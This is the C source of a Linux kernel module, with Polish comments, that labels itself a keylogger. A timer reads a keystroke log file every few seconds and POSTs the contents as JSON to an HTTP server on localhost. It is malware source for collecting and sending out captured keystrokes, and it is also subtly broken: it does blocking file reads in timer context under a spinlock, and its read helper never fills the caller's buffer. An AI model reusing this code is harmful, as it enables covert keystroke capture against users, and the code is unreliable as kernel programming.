#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/socket.h>
#include <linux/timer.h>
#include <linux/workqueue.h>
#include <net/sock.h>
#include <linux/inet.h>
#include <linux/uio.h>
#include <linux/kfifo.h>

#define PORT 5247
#define TIMER_INTERVAL 5 * HZ
#define LOG_FILE_PATH "/tmp/keylog.txt"
#define PIPE_SIZE 512 // Rozmiar pipe
static DECLARE_KFIFO(pipe_fifo, char, PIPE_SIZE);
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Your Name");
MODULE_DESCRIPTION("Kernel Module Sending HTTP Request");

static struct timer_list my_timer;
static struct workqueue_struct *http_workqueue;

static DEFINE_SPINLOCK(file_lock);

struct http_work_data
{
    struct work_struct work;
    char *post_data;
};

static int read_from_logs_file(char *buffer2, size_t buffer_size2)
{
    struct file *file;
    char buffer[256]; // Bufor do przechowywania danych z pliku
    loff_t pos = 0;   // Pozycja odczytu w pliku
    ssize_t ret;

    pr_info("Keylogger module loaded: Reading data from file: %s\n", LOG_FILE_PATH);

    // Zablokuj spinlock, aby nie dopuścić do współbieżnego dostępu
    spin_lock(&file_lock);

    // Otwórz plik w trybie tylko do odczytu
    file = filp_open(LOG_FILE_PATH, O_RDONLY, 0777);
    if (IS_ERR(file))
    {
        pr_err("Failed to open log file for reading. Error: %ld\n", PTR_ERR(file));
        spin_unlock(&file_lock); // Zwolnij spinlock, jeśli otwarcie pliku się nie udało
        return PTR_ERR(file);
    }

    // Odczytuj dane z pliku i wypisz w logach
    ret = kernel_read(file, buffer, sizeof(buffer) - 1, &pos);
    if (ret < 0)
    {
        pr_err("Failed to read from log file. Error: %ld\n", ret);
        filp_close(file, NULL);
        spin_unlock(&file_lock); // Zwolnij spinlock w przypadku błędu
        return ret;
    }

    // Null-terminate buffer
    buffer[ret] = '\0';

    // Wypisz odczytane dane w logach jądra
    pr_info("Data from log file: %s\n", buffer);

    // Zamknij plik
    filp_close(file, NULL);

    // Zwolnij spinlock
    spin_unlock(&file_lock);

    return ret;
}

static void send_http_post_work(struct work_struct *work)
{
    struct http_work_data *data = container_of(work, struct http_work_data, work);
    struct socket *sock;
    struct sockaddr_in server_addr;
    struct msghdr msg = {0};
    struct kvec vec;
    char *http_request;
    char *response;
    int ret;

    http_request = kzalloc(1024, GFP_KERNEL);
    if (!http_request)
    {
        pr_err("Memory allocation for HTTP request failed\n");
        kfree(data->post_data);
        kfree(data);
        return;
    }

    snprintf(http_request, 1024,
             "POST /weatherforecast HTTP/1.1\r\n"
             "Host: localhost:5247\r\n"
             "Content-Type: application/json\r\n"
             "Content-Length: %zu\r\n"
             "\r\n"
             "%s",
             strlen(data->post_data), data->post_data);

    ret = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
    if (ret < 0)
    {
        pr_err("Failed to create socket: %d\n", ret);
        kfree(http_request);
        kfree(data->post_data);
        kfree(data);
        return;
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT);
    in4_pton("127.0.0.1", -1, (u8 *)&server_addr.sin_addr.s_addr, '\0', NULL);

    ret = kernel_connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr), 0);
    if (ret < 0)
    {
        pr_err("Failed to connect to server: %d\n", ret);
        sock_release(sock);
        kfree(http_request);
        kfree(data->post_data);
        kfree(data);
        return;
    }

    vec.iov_base = http_request;
    vec.iov_len = strlen(http_request);
    msg.msg_flags = 0;

    ret = kernel_sendmsg(sock, &msg, &vec, 1, strlen(http_request));
    if (ret < 0)
        pr_err("Failed to send HTTP request: %d\n", ret);

    response = kzalloc(1024, GFP_KERNEL);
    if (response)
    {
        vec.iov_base = response;
        vec.iov_len = 1024;
        ret = kernel_recvmsg(sock, &msg, &vec, 1, 1024, msg.msg_flags);
        if (ret >= 0)
            pr_info("Received response: %s\n", response);
        kfree(response);
    }

    sock_release(sock);
    kfree(http_request);
    kfree(data->post_data);
    kfree(data);
}

static void timer_callback(struct timer_list *t)
{
    char pipeBuffer[256] = {0}; // Bufor do odczytu z pipe
    int bytes_read;

    // Odczytaj dane z pipe
    bytes_read = read_from_logs_file(pipeBuffer, sizeof(pipeBuffer));
    pr_warn("Received from pipe: %s\n", pipeBuffer);

    // Przygotuj dynamiczne dane JSON
    struct http_work_data *data = kmalloc(sizeof(*data), GFP_KERNEL);
    if (!data)
        return;

    data->post_data = kmalloc(512, GFP_KERNEL); // Przydziel miejsce na JSON
    if (!data->post_data)
    {
        kfree(data);
        return;
    }

    snprintf(data->post_data, 512,
             "{\"Time\":\"2137\",\"ID\":\"69\",\"Key\":\"%s\"}", pipeBuffer);

    // Przekaż dane do workqueue
    pr_warn("Json structure: %s\n", data->post_data);
    INIT_WORK(&data->work, send_http_post_work);
    queue_work(http_workqueue, &data->work);

    // Harmonogram kolejnego wywołania timera
    mod_timer(&my_timer, jiffies + TIMER_INTERVAL);
}

static int __init send_http_post_init(void)
{

    pr_info("LOADING:");
    char test[20];
    read_from_logs_file(test, 20);
    http_workqueue = alloc_workqueue("http_workqueue", WQ_UNBOUND, 0);
    if (!http_workqueue)
        return -ENOMEM;

    timer_setup(&my_timer, timer_callback, 0);
    mod_timer(&my_timer, jiffies + TIMER_INTERVAL);

    pr_info("HTTP POST kernel module loaded\n");
    return 0;
}

static void __exit send_http_post_exit(void)
{
    del_timer_sync(&my_timer);
    destroy_workqueue(http_workqueue);
    pr_info("HTTP POST kernel module unloaded\n");
}

module_init(send_http_post_init);
module_exit(send_http_post_exit);
